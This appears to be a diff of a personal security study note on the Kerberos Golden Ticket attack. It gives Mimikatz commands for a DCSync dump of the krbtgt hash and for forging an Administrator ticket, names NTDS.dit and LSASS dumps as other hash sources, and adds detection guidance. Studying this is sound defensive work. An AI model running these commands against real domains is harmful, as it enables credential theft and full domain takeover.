@@ -1,7 +1,7 @@
 ### General Notes
 
 This is an attack where threat agents can generate [[Kerberos]] tickets for any [[Objects#Users|User]] in the domain.
-- The attacker here acts as a [[Domain Controller]].
+- The attacker here acts as a [[Domain Controller]] and impersonates the `domain administrator` role.
 
 This attack exploits the fact that:
 1. The Kerberos `krbtgt` service account has the same password across all Domain Controllers.
@@ -38,13 +38,15 @@ powershell -exec bypass
 Get-DomainSID
 ```
 
-To obtain the password hash of the `rc4` account, one technique we can use is the [[DCSync]] attack if we have an account with the necessary permissions.
+To obtain the password `rc4` hash of the `krbtgt` account, one technique we can use is the [[DCSync]] attack if we have an account with the necessary permissions.
 - We can use `Mimikatz` and specify the target domain and the `krbtgt` user.
 ```powershell
 mimkatz.exe
 lsadump::dcsync /domain:<domainname> /user:krbtgt
 ```
 - This will output the [[NTLM]] hash of the `krbtgt` user.
+
+> Another technique to obtain the hash of the `krbtgt` account is to view `NTDS.dit` and [[Windows Processes#`lsass.exe`|LSASS]] process dumps on the [[Domain Controller]].
 
 Now we can use *Mimikatz* tool with all of this information to obtain a golden ticket for the *Administrator* user.
 - The `/ptt` argument makes `Mimikatz` pass the ticket into the current session.
@@ -54,7 +56,7 @@ mimikatz.exe
 kerberos::golden /domain:<domainname> /sid:<sidvalue> /rc4:<hash> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
 ```
 
-We can then check the list of [[Kerberos]] tickets in the current session using the `klist` command.
+> We can then check the list of [[Kerberos]] tickets in the current session using the `klist` command.
 
 ---
 ### Prevention & Detection
@@ -64,5 +66,12 @@ We monitor for [[Windows Events Log]] events with ID `4769`, which mean that a [
 - The service could be the `krbtgt` service.
 
 If `SID filtering` is enabled, we will get alerts with the event ID `4675` during cross-domain escalation.
+
+We can also monitor for the extraction of the `krbtgt` hash by checking for:
+- a [[DCSync]] attack.
+- `NTDS.dit` file access. (check out [[Domain Controller#NTDS.DIT|NTDS.dit]])
+- [[Windows Processes#`lsass.exe`|LSASS]] memory read via [[Sysmon]] event ID `10`.
+
+> Can also be detected via the same techniques as [[Pass the Ticket]], check out [[Splunk Queries#Detecting Pass the Ticket]].
 
 ---
